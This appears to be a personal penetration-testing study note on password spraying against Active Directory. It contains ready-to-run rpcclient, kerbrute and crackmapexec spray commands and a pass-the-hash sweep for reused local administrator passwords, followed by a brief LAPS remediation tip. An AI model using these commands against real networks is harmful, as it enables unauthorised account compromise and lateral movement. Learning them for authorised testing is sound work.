# RPCClient
```JavaScript
for u in $(cat <userlist>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
```
![[/image 354.png|image 354.png]]
  
# Kerbrute
```JavaScript
kerbrute passwordspray -d <DOMAIN> --dc <IP> <userlist> <pass_to_spray>
```
![[/image 1 262.png|image 1 262.png]]
  
# Crackmapexec
```JavaScript
crackmapexec smb <IP> -u <userlist> -p <pass_to_spray> | grep +
```
![[/image 2 225.png|image 2 225.png]]
  
# Local Administrator Password Reuse
more common than I thought
- happens due to the use of gold images in automated deployment and ease of access
- good targets are high-valued hosts such as SQL or Microsoft Exchange
    
    - these hosts are more likely to have local administrator logged in or stored in memory
    
  
once we have a local administrator, we can use crackmapexec to try to authenticate to other machines with the same password
```JavaScript
crackmapexec smb --local-auth <CIDR> -u administrator -H <hash> | grep +
```
- local-auth tells cme to only attempt to log in one at a time on each machine to avoid lockout
  
to remediate this, use Local Administrator Password Solution (LAPS)
- have AD manage local admin passwords and enforce strong, unique passwords that rotate